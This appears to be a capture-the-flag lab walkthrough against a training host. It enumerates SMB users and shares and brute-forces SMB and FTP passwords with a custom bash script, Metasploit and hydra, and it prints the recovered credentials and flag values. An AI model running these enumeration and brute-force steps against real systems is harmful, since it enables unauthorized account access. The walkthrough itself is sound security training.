Target ip : target.ine.local -> 192.218.180.3

```bash
enum4linux 192.218.180.3
```

Users : josh, nancy, bob, alice

Using metaploit and the users found, we can try to brute force password :

josh : purple
alice: admsh

---

SCRIPT TO BRUTEFORCE SHARES :

```bash
#!/bin/bash

# Define the target and wordlist location
TARGET="target.ine.local"
WORDLIST="/root/Desktop/wordlists/shares.txt"

# Check if the wordlist file exists
if [ ! -f "$WORDLIST" ]; then
    echo "Wordlist not found: $WORDLIST"
    exit 1
fi

# Loop through each share in the wordlist
while read -r SHARE; do
    echo "Testing share: $SHARE"
    smbclient //$TARGET/$SHARE -N -c "ls" &>/dev/null

    if [ $? -eq 0 ]; then
        echo "[+] Anonymous access allowed for: $SHARE"
    else
        echo "[-] Access denied for: $SHARE"
    fi
done < "$WORDLIST"
```

We found this share : 
Testing share: pubfiles
[+] Anonymous access allowed for: pubfiles

----

Let's connect to the share :
```bash
smbclient  //192.218.180.3/pubfiles

get flag1.txt
exit

cat flag1.txt
FLAG1{504fd8cd25f84d7584471d3e47f30834}
```

----

Ler's connect to the josh share with the password found sooner
```bash
smbclient  \\\\192.218.180.3\\josh -U josh

get flag2.txt
exit

cat flag2.txt
FLAG2{b2746bfaaf294d19b9bcca91a146a4c9}

Psst! I heard there is an FTP service running. Find it and check the banner. 
```

---

Hint given : Psst! I heard there is an FTP service running. Find it and check the banner. 

```bash
nmap -p- target.ine.loal

PORT     STATE SERVICE
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5554/tcp open  sgi-esphttp

nmap -p5554 -sC -sV target.ine.loal

5554/tcp open  ftp     vsftpd 2.0.8 or later
MAC Address: 02:42:C0:DA:B4:03 (Unknown)
Service Info: Host: blah

ftp target.ine.local -P 5554                                                                                                                                                                                        
Connected to target.ine.local.
220 Welcome to blah FTP service. Reminder to users, specifically ashley, alice and amanda to change their weak passwords immediately!!!
```

Let's bruteforce the password of the users with weak passwords with Metasploit and hydra:

```bash
hydra -l alice -P /root/Desktop/wordlists/unix_passwords.txt -v -I ftp://192.218.180.3:5554
[5554][ftp] host: 192.218.180.3   login: alice   password: pretty

```
User : alice
Pass : pretty

----

Let's connect to the ftp service with this credentials :
```bash
ftp 192.218.180.3 -P 5554

get flag3.txt
exit

cat flag3.txt
FLAG3{5b78c2dbf0f94fac90e0ca4b2673390b}
```
----

Trying to connect to the ssh service :
FLAG4{4e86e1b0ff9c468b9371a639e9e6950d}

















